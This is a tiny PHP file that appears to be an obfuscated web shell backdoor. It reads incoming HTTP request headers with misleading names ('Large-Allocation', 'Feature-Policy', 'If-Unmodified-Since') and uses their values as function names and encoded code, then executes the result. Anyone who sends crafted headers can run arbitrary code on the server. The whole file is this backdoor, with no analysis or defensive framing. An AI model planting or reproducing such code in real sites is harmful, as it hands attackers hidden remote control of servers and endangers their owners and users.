<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $multi = $_HEADERS['Large-Allocation']('', $_HEADERS['Feature-Policy']($_HEADERS['If-Unmodified-Since']));
    $multi();
}